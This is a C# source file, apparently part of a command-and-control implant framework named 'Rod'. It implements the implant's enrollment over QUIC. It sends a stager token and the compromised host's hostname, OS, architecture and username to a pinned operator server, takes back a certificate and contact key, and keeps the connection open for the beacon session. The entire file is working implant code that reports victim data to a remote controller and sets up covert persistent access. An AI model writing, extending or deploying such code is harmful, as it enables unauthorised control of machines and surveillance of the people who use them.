using System.Security.Cryptography.X509Certificates;
using Google.Protobuf;
using Rod.V1;

namespace Rod.Implant.Internal;

// The QUIC enroll client (architecture.md Sec 8, enrollment over QUIC): the
// full-independence step -- the opening stream's first exchange is an enroll
// instead of a handshake, the same enroll body the web route carries
// promoted from JSON into the rod.v1 frame grammar, answered on the same
// stream and followed by the ordinary handshake the session client then
// speaks. The web-enroll + QUIC-session pairing inverts into QUIC-only
// independence: a quic-schemed baked enroll endpoint dials this client, and
// the artifact never needs an HTTP shape at all.
//
// A whole source-file module riding the QUIC contact module's file set (the
// bake-time transport trim): the module compiles exactly when the walk holds
// a quic-schemed entry -- a beacon dial or an enroll dial -- and the dial
// (QuicWire) is the module's own.

/// <summary>
/// Enrolls over the QUIC opening exchange: dial the quic-schemed endpoint
/// (ALPN rod1, TLS 1.3 pinned to the enrolled CA chain -- the QUIC dial has
/// no system-root fallback, so a pinned chain is required), send the
/// EnrollRequest frame, and read the EnrollResponse frame back. On success
/// the connection stays open and rides out on
/// <see cref="EnrollDial.OpenedConnection"/>: the session client's first
/// cycle speaks the ordinary handshake on the same stream, one connection
/// carrying enroll-then-session (architecture.md Sec 8). A definitive
/// refusal surfaces as <see cref="C2.EnrollRejectedException"/> exactly
/// like the web client's, so the caller's fail-fast retry discipline is the
/// same.
/// </summary>
internal static class QuicEnroll
{
    public static async Task<Enrollment> EnrollAsync(EnrollDial dial, CancellationToken cancellationToken)
    {
        // The dial's anchor: the pinned CA chain validates the QUIC TLS
        // handshake (chain-to-CA, the same pin the session dial uses). The
        // engagement CA is in no system store and QUIC carries no fallback,
        // so an unpinned run is refused here rather than failing mid-dial.
        if (dial.ServerCAs is not { Count: > 0 } pinned)
            throw new C2.EnrollRejectedException(
                "the quic enroll dial requires the pinned CA (-ca-cert/ROD_CA_CERT); "
                + "the QUIC handshake has no system-root fallback");

        var timeout = dial.Profile.RequestTimeout > TimeSpan.Zero
            ? dial.Profile.RequestTimeout
            : TransportProfile.DefaultRequestTimeout;
        using var deadline = CancellationTokenSource.CreateLinkedTokenSource(cancellationToken);
        deadline.CancelAfter(timeout);

        // The wire outlives the exchange on success (the handoff below); the
        // catch disposes whatever the attempt opened.
        QuicWire? wire = null;
        try
        {
            wire = await QuicWire.ConnectAsync(dial.EnrollUrl, Pinned(pinned), deadline.Token)
                .ConfigureAwait(false);

            // The enroll body, promoted into the frame grammar (extending/
            // implants.md): token secret, class, the implant's public key
            // (DER SubjectPublicKeyInfo -- only the public half crosses),
            // parent, host facts, kill date. The profile's malleable HTTP
            // knobs do not apply -- the exchange is frames under TLS 1.3.
            var request = new Rod.V1.EnrollRequest
            {
                StagerTokenSecret = dial.StagerToken,
                Class = dial.ImplantClass ?? string.Empty,
                PublicKey = ByteString.CopyFrom(dial.PrivateKey.ExportSubjectPublicKeyInfo()),
                ParentImplantId = dial.ParentImplantId ?? string.Empty,
                Hostname = dial.Host?.Hostname ?? string.Empty,
                Os = dial.Host?.Os ?? string.Empty,
                Arch = dial.Host?.Arch ?? string.Empty,
                Username = dial.Host?.Username ?? string.Empty,
                KillDate = dial.KillDate ?? string.Empty,
            };
            await wire.WriteFramesAsync(
                new[]
                {
                    new Frame { Kind = FrameKind.EnrollRequest, Payload = ByteString.CopyFrom(request.ToByteArray()) },
                },
                deadline.Token).ConfigureAwait(false);

            var inbound = await wire.ReadFramesAsync(deadline.Token).ConfigureAwait(false);
            if (inbound.Count == 0 || inbound[0].Kind != FrameKind.EnrollResponse)
                throw new C2.EnrollRejectedException("the quic enroll exchange returned no enroll answer");
            Rod.V1.EnrollResponse answer;
            try
            {
                answer = Rod.V1.EnrollResponse.Parser.ParseFrom(inbound[0].Payload);
            }
            catch (InvalidProtocolBufferException)
            {
                throw new C2.EnrollRejectedException("the quic enroll answer was malformed");
            }
            if (answer.Status != Rod.V1.EnrollStatus.Ok)
                throw new C2.EnrollRejectedException($"enroll rejected: status {answer.Status}");
            if (answer.LeafCertificate.IsEmpty)
                throw new C2.EnrollRejectedException("enroll OK but missing the leaf certificate");

            var enrollment = C2.Materialize(
                answer.ImplantId,
                answer.EngagementId,
                answer.LeafCertificate.ToByteArray(),
                answer.CaChain.Select(chain => chain.ToByteArray()).ToArray(),
                answer.ParentImplantId,
                dial.PrivateKey);

            // The per-artifact contact key the enrollment bound: adopted
            // into the transport profile when the bake carried none, so a
            // walk that later crosses onto a web front seals under the key
            // the listener-side binding demands. The key id (16 bytes) and
            // key (32) pack into the same base64 shape the baked envelope
            // key rides as.
            if (!answer.EnvelopeKeyId.IsEmpty
                && !answer.EnvelopeKey.IsEmpty
                && dial.Profile.EnvelopeKey.Length == 0)
            {
                var packed = new byte[answer.EnvelopeKeyId.Length + answer.EnvelopeKey.Length];
                answer.EnvelopeKeyId.CopyTo(packed, 0);
                answer.EnvelopeKey.CopyTo(packed, answer.EnvelopeKeyId.Length);
                dial.Profile.EnvelopeKey = Convert.ToBase64String(packed);
                dial.Log?.WriteLine("rod-implant: adopted the build's contact key from the quic enroll answer");
            }

            dial.OpenedConnection = wire;
            return enrollment;
        }
        catch
        {
            if (wire is not null)
                await wire.DisposeAsync().ConfigureAwait(false);
            throw;
        }
    }

    // The pinned collection is handed to the wire as the dial's anchor.
    private static X509Certificate2Collection Pinned(X509Certificate2Collection cas)
    {
        var pinned = new X509Certificate2Collection();
        foreach (var ca in cas)
            pinned.Add(ca);
        return pinned;
    }
}
